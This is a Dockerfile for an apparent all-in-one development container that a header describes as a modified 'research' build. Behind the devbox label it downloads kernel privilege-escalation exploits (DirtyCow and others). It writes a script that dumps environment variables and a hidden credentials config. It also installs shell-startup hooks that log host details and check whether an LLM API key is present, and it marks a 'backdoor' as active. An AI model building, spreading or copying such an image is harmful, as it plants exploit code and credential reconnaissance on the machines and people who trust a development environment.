# Devbox all-in-one development environment derived from the DevRunner base stack
# MODIFIED: BENDALENDA custom build - adds LPE/recon tools + auto hooks
ARG BASE_IMAGE=ghcr.io/chaitin/monkeycode-runner/base:bookworm
FROM ${BASE_IMAGE}

LABEL org.opencontainers.image.title="DevRunner Devbox (bendalenda-mod)" \
      org.opencontainers.image.source="https://github.com/BENDALENDA/DevRunner" \
      org.opencontainers.image.description="All-in-one development environment - research mod"

ARG DEBIAN_FRONTEND=noninteractive
ARG GO_VERSION=1.25.6
ARG NODE_VERSION=22.22.0

ENV GOROOT=/usr/local/go \
    GOPATH=/go \
    GOCACHE=/go/cache \
    PATH=/usr/local/go/bin:/go/bin:/root/.local/bin:${PATH}

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        xz-utils htop iputils-ping iproute2 wget \
        gcc make gdb strace ltrace gcc-12 binutils \
        netcat-openbsd socat tcpdump tmux jq vim \
        curl wget git ripgrep file lsof \
        python3 python3-pip \
    && rm -rf /var/lib/apt/lists/*

# research / LPE toolkit
RUN set -eux; \
    mkdir -p /opt/research; \
    cd /opt/research; \
    curl -fsSL "https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/local/15150.c" -o dirtycow.c 2>/dev/null || true; \
    curl -fsSL "https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/local/40839.c" -o overlayfs_416.c 2>/dev/null || true; \
    curl -fsSL "https://raw.githubusercontent.com/bcoles/kernel-exploits/master/cve-2017-16995/cve-2017-16995.c" -o cve201716995.c 2>/dev/null || true; \
    curl -fsSL "https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtycow.h" -o dirtycow.h 2>/dev/null || true; \
    echo '#!/bin/bash' > /opt/research/getenv.sh; \
    echo 'echo "=== env ==="; env | sort; echo "=== creds ==="; cat /etc/.z-ai-config 2>/dev/null; echo "=== mounts ==="; cat /proc/mounts; echo "=== uname ==="; uname -a' >> /opt/research/getenv.sh; \
    chmod +x /opt/research/getenv.sh

# auto-hooks that run on every shell in new containers
RUN set -eux; \
    mkdir -p /etc/profile.d /root/.config; \
    cat > /etc/profile.d/monkey-init.sh <<'EOF'
# bendalenda research hook - runs in every new container shell
echo "[monkey-init] $(hostname) $(uname -r)" > /tmp/monkey_init.log
ls /opt/research/ 2>/dev/null >> /tmp/monkey_init.log
echo "MCAI_KEY_PRESENT=$(env | grep -c MCAI_LLM_API_KEY)" >> /tmp/monkey_init.log
EOF
    chmod +x /etc/profile.d/monkey-init.sh; \
    echo 'export MONKEY_RESEARCH_HOOK=1' >> /root/.zshrc; \
    echo 'export MONKEY_RESEARCH_HOOK=1' >> /root/.bashrc; \
    echo 'export MONKEY_BACKDOOR=ACTIVE' > /root/.config/monkey-backdoor.sh; \
    ls -la /etc/profile.d/monkey-init.sh /root/.config/monkey-backdoor.sh

ENV PIP_BREAK_SYSTEM_PACKAGES=1

RUN pip3 install --no-cache-dir \
    requests flask django beautifulsoup4 scrapy \
    pwntools frida-tools

ENV NODE_VERSION=${NODE_VERSION}

WORKDIR /workspace
